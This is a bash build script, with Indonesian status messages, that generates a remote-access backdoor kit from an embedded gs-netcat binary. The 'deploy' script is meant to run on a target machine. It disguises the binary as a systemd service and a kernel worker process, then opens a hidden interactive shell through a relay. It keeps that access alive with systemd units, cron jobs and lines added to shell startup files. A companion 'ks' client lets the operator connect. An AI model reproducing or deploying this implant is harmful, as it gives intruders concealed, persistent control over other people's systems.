#!/bin/bash
set -e

BIN="tools/gs-netcat"
if [ ! -f "$BIN" ]; then
    echo "[-] Binary tidak ditemukan. Jalankan build.sh dulu"
    exit 1
fi

BIN_B64=$(base64 -w0 "$BIN")
OUTDIR="$(pwd)/output"
mkdir -p "$OUTDIR"

echo "[*] Generating deploy..."

cat > "${OUTDIR}/deploy" << 'DEPLOY_HEADER'
#!/bin/bash
SECRET="${S:-}"
ACTION="install"
DBIN="systemd-userdbd"
DSVC="systemd-userdbd"
DPROC="[kworker/u8:2-ev]"
DDESC="User Database Manager"

while [ $# -gt 0 ]; do
    case "$1" in
        -s) SECRET="$2"; shift 2 ;;
        uninstall|remove) ACTION="uninstall"; shift ;;
        status) ACTION="status"; shift ;;
        *) shift ;;
    esac
done

if [ "$(id -u)" -eq 0 ]; then
    IDIR="/usr/lib/${DBIN}"
else
    IDIR="${HOME}/.config/${DBIN}"
fi
BIN="${IDIR}/${DBIN}"

do_uninstall() {
    pkill -f "${BIN}" 2>/dev/null || true
    sleep 1
    if [ "$(id -u)" -eq 0 ]; then
        systemctl stop ${DSVC}.service 2>/dev/null || true
        systemctl disable ${DSVC}.service 2>/dev/null || true
        rm -f /etc/systemd/system/${DSVC}.service
        systemctl daemon-reload 2>/dev/null
    else
        systemctl --user stop ${DSVC}.service 2>/dev/null || true
        systemctl --user disable ${DSVC}.service 2>/dev/null || true
        rm -f "${HOME}/.config/systemd/user/${DSVC}.service"
        systemctl --user daemon-reload 2>/dev/null
    fi
    (crontab -l 2>/dev/null || true) | grep -v "${DBIN}" | crontab - 2>/dev/null || true
    for f in "${HOME}/.bashrc" "${HOME}/.profile" "${HOME}/.bash_profile" "${HOME}/.zshrc"; do
        [ -f "$f" ] && sed -i "/${DDESC}/,+1d" "$f" 2>/dev/null || true
    done
    rm -rf "${IDIR}"
    echo "[+] Uninstall selesai"
    exit 0
}

do_status() {
    if [ -f "${BIN}" ]; then
        echo "[+] Binary: ${BIN}"
    else
        echo "[-] NOT INSTALLED"
        exit 1
    fi
    if [ -f "${IDIR}/.k" ]; then
        echo "[+] Secret: $(cat ${IDIR}/.k | base64 -d 2>/dev/null)"
    fi
    if pgrep -f "${BIN}" >/dev/null 2>&1; then
        echo "[+] Status: RUNNING (PID $(pgrep -f ${BIN} | head -1))"
    else
        echo "[-] Status: NOT running"
    fi
    exit 0
}

[ "${ACTION}" = "uninstall" ] && do_uninstall
[ "${ACTION}" = "status" ] && do_status

if [ -z "${SECRET}" ]; then
    SECRET=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 22)
fi

echo "[*] KSocket Deploy"
echo "[*] Secret : ${SECRET}"
echo "[*] User   : $(whoami)"
echo "[*] Target : ${IDIR}"

mkdir -p "${IDIR}"

echo "[*] Extracting binary..."
base64 -d << 'BINEOF' > "${BIN}"
DEPLOY_HEADER

echo "$BIN_B64" >> "${OUTDIR}/deploy"

cat >> "${OUTDIR}/deploy" << 'DEPLOY_FOOTER'
BINEOF
chmod +x "${BIN}"
echo "[+] Binary: ${BIN} ($(ls -lh ${BIN} | awk '{print $5}'))"

echo "${SECRET}" | base64 > "${IDIR}/.k"
chmod 600 "${IDIR}/.k"

cat > "${IDIR}/run.sh" << REOF
#!/bin/bash
D="\$(cd "\$(dirname "\$0")" && pwd)"
B="\${D}/${DBIN}"
S=\$(cat "\${D}/.k" | base64 -d 2>/dev/null)
[ -z "\$S" ] && exit 1
pgrep -f "\$B" >/dev/null 2>&1 && exit 0
GSOCKET_ARGS="-s \${S} -liqD" exec -a "${DPROC}" "\$B"
REOF
chmod +x "${IDIR}/run.sh"

if [ "$(id -u)" -eq 0 ]; then
    cat > /etc/systemd/system/${DSVC}.service << SEOF
[Unit]
Description=${DDESC}
After=network-online.target
Wants=network-online.target
StartLimitIntervalSec=0
[Service]
Type=forking
ExecStart=/bin/bash ${IDIR}/run.sh
Restart=always
RestartSec=30
KillMode=process
StandardOutput=null
StandardError=null
[Install]
WantedBy=multi-user.target
SEOF
    systemctl daemon-reload 2>/dev/null
    systemctl enable ${DSVC}.service 2>/dev/null
    systemctl start ${DSVC}.service 2>/dev/null
    echo "[+] Persistence: systemd"
fi

(crontab -l 2>/dev/null || true) | grep -v "${DBIN}" | crontab - 2>/dev/null || true
(crontab -l 2>/dev/null || true; \
 echo "@reboot bash ${IDIR}/run.sh"; \
 echo "* * * * * pgrep -f '${BIN}' >/dev/null 2>&1 || bash ${IDIR}/run.sh") \
 | crontab - 2>/dev/null
echo "[+] Persistence: crontab (1 menit)"

PAYLOAD="# ${DDESC}
(pgrep -f '${BIN}' >/dev/null 2>&1 || nohup bash ${IDIR}/run.sh >/dev/null 2>&1 &)"

for RCFILE in "${HOME}/.bashrc" "${HOME}/.profile" "${HOME}/.bash_profile" "${HOME}/.zshrc"; do
    [ ! -f "${RCFILE}" ] && touch "${RCFILE}"
    grep -q "${DDESC}" "${RCFILE}" 2>/dev/null || printf "%s\n" "${PAYLOAD}" >> "${RCFILE}"
done
echo "[+] Persistence: .bashrc .profile .bash_profile .zshrc"

if [ "$(id -u)" -ne 0 ]; then
    USVC_DIR="${HOME}/.config/systemd/user"
    mkdir -p "${USVC_DIR}"
    cat > "${USVC_DIR}/${DSVC}.service" << USEOF
[Unit]
Description=${DDESC}
After=default.target

[Service]
Type=forking
ExecStart=/bin/bash ${IDIR}/run.sh
Restart=always
RestartSec=30
KillMode=process
StandardOutput=null
StandardError=null

[Install]
WantedBy=default.target
USEOF
    systemctl --user daemon-reload 2>/dev/null
    systemctl --user enable ${DSVC}.service 2>/dev/null
    systemctl --user start ${DSVC}.service 2>/dev/null
    loginctl enable-linger $(whoami) 2>/dev/null
    echo "[+] Persistence: systemd --user"
fi

bash "${IDIR}/run.sh"
sleep 1

echo ""
echo "[+] ==============================="
echo "[+]  DEPLOY SELESAI"
echo "[+] ==============================="
echo "[+] Connect : ks -s \"${SECRET}\" -i"
echo "[+] Uninstall: bash $0 uninstall"
DEPLOY_FOOTER

chmod +x "${OUTDIR}/deploy"

echo "[*] Generating ks..."

cat > "${OUTDIR}/ks" << 'KS_HEADER'
#!/bin/bash
DISGUISE_BIN="systemd-userdbd"
DISGUISE_SVC="systemd-userdbd"
DISGUISE_PROC="[kworker/u8:2-ev]"
DISGUISE_DESC="User Database Manager"
CUSTOM_RELAY=""
KSBIN=""

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

log_ok()   { echo -e "${GREEN}[+]${NC} $1"; }
log_info() { echo -e "${CYAN}[*]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[!]${NC} $1"; }
log_err()  { echo -e "${RED}[-]${NC} $1"; }

is_root() { [ "$(id -u)" -eq 0 ]; }

ensure_bin() {
    KSBIN="/tmp/.ks_$$"
    if [ ! -x "$KSBIN" ]; then
        sed -n '/^##BINARY_START##$/,/^##BINARY_END##$/p' "$0" | grep -v '^##' | base64 -d > "$KSBIN" 2>/dev/null
        chmod +x "$KSBIN"
    fi
    if [ ! -x "$KSBIN" ]; then
        log_err "Failed to extract binary"
        exit 1
    fi
    trap "rm -f $KSBIN" EXIT
}

do_generate() {
    cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 22
    echo ""
}

do_connect() {
    local SECRET="$1"; shift
    ensure_bin
    [ -n "$CUSTOM_RELAY" ] && export GSOCKET_HOST="$CUSTOM_RELAY"
    log_info "Connecting..."
    echo ""
    exec "$KSBIN" -s "$SECRET" -i "$@"
}

do_listen() {
    local SECRET="$1"; local DAEMON="$2"; shift 2
    ensure_bin
    [ -n "$CUSTOM_RELAY" ] && export GSOCKET_HOST="$CUSTOM_RELAY"
    if [ "$DAEMON" = "1" ]; then
        log_info "Starting listener (daemon)..."
        local RE=""
        [ -n "$CUSTOM_RELAY" ] && RE="GSOCKET_HOST=${CUSTOM_RELAY}"
        env $RE GSOCKET_ARGS="-s ${SECRET} -liqD" "$KSBIN" "$@" &
        sleep 1
        log_ok "Listener running"
        log_info "Connect: ks -s \"${SECRET}\" -i"
    else
        log_info "Starting listener..."
        log_info "Connect: ks -s \"${SECRET}\" -i"
        echo ""
        exec "$KSBIN" -s "$SECRET" -l -i "$@"
    fi
}

do_uninstall() {
    if is_root; then
        INSTALL_DIR="/usr/lib/${DISGUISE_BIN}"
    else
        INSTALL_DIR="${HOME}/.config/${DISGUISE_BIN}"
    fi
    BIN_COPY="${INSTALL_DIR}/${DISGUISE_BIN}"
    log_info "Uninstalling..."
    pkill -f "${BIN_COPY}" 2>/dev/null || true
    sleep 1
    if is_root; then
        local SVC="/etc/systemd/system/${DISGUISE_SVC}.service"
        if [ -f "$SVC" ]; then
            systemctl stop ${DISGUISE_SVC}.service 2>/dev/null || true
            systemctl disable ${DISGUISE_SVC}.service 2>/dev/null || true
            rm -f "$SVC"
            systemctl daemon-reload 2>/dev/null
            log_ok "Systemd removed"
        fi
    else
        systemctl --user stop ${DISGUISE_SVC}.service 2>/dev/null || true
        systemctl --user disable ${DISGUISE_SVC}.service 2>/dev/null || true
        rm -f "${HOME}/.config/systemd/user/${DISGUISE_SVC}.service"
        systemctl --user daemon-reload 2>/dev/null
        log_ok "Systemd --user removed"
    fi
    (crontab -l 2>/dev/null || true) | grep -v "${DISGUISE_BIN}" | crontab - 2>/dev/null || true
    log_ok "Crontab removed"
    for f in "${HOME}/.bashrc" "${HOME}/.profile" "${HOME}/.bash_profile" "${HOME}/.zshrc"; do
        [ -f "$f" ] && sed -i "/${DISGUISE_DESC}/,+1d" "$f" 2>/dev/null || true
    done
    log_ok "Shell rc removed"
    [ -d "$INSTALL_DIR" ] && rm -rf "$INSTALL_DIR" && log_ok "Removed: ${INSTALL_DIR}"
    echo ""
    log_ok "=== UNINSTALL SELESAI ==="
}

do_status() {
    if is_root; then
        INSTALL_DIR="/usr/lib/${DISGUISE_BIN}"
    else
        INSTALL_DIR="${HOME}/.config/${DISGUISE_BIN}"
    fi
    BIN_COPY="${INSTALL_DIR}/${DISGUISE_BIN}"
    echo ""
    echo -e "${BOLD}=== KSocket Status ===${NC}"
    echo ""
    [ -f "$BIN_COPY" ] && log_ok "Binary  : ${BIN_COPY}" || log_err "Binary  : NOT INSTALLED"
    [ -f "${INSTALL_DIR}/.k" ] && log_ok "Secret  : $(cat ${INSTALL_DIR}/.k | base64 -d 2>/dev/null)"
    pgrep -f "${BIN_COPY}" >/dev/null 2>&1 && log_ok "Status  : RUNNING (PID $(pgrep -f ${BIN_COPY} | head -1))" || log_err "Status  : NOT running"
    echo ""
}

show_usage() {
    cat << 'U'
  Connect  : ks -s "SECRET" -i
  Generate : ks -g
  Listen   : ks -s "SECRET" -l -i [-D]
  Relay    : ks --relay HOST -s "SECRET" -i
  Status   : ks status
  Uninstall: ks uninstall
U
}

case "${1:-}" in
    uninstall|remove) do_uninstall; exit 0 ;;
    status) do_status; exit 0 ;;
    connect)
        if is_root; then SF="/usr/lib/${DISGUISE_BIN}/.k"; else SF="${HOME}/.config/${DISGUISE_BIN}/.k"; fi
        [ -f "$SF" ] && do_connect "$(cat $SF | base64 -d 2>/dev/null)" || log_err "No saved secret. Use: ks -s SECRET -i"
        exit 0 ;;
    help|--help|-h) show_usage; exit 0 ;;
esac

SECRET="" LISTEN=0 DAEMON=0 GENERATE=0 EXTRA_ARGS=""
while [ $# -gt 0 ]; do
    case "$1" in
        -s) SECRET="$2"; shift 2 ;; -l) LISTEN=1; shift ;; -i) shift ;;
        -D) DAEMON=1; shift ;; -g) GENERATE=1; shift ;;
        --relay) CUSTOM_RELAY="$2"; shift 2 ;;
        *) EXTRA_ARGS="$EXTRA_ARGS $1"; shift ;;
    esac
done

[ "$GENERATE" = "1" ] && { do_generate; exit 0; }
[ -z "$SECRET" ] && { show_usage; exit 1; }
[ "$LISTEN" = "1" ] && { do_listen "$SECRET" "$DAEMON" $EXTRA_ARGS; } || { do_connect "$SECRET" $EXTRA_ARGS; }
exit 0
##BINARY_START##
KS_HEADER

echo "$BIN_B64" >> "${OUTDIR}/ks"
echo '##BINARY_END##' >> "${OUTDIR}/ks"

chmod +x "${OUTDIR}/ks"

echo ""
echo "[+] Output:"
ls -lh "${OUTDIR}/deploy" "${OUTDIR}/ks"
echo ""
echo "[+] deploy -> taruh di target, jalankan ./deploy"
echo "[+] ks     -> taruh di mesin lu, jalankan ks -s SECRET -i"
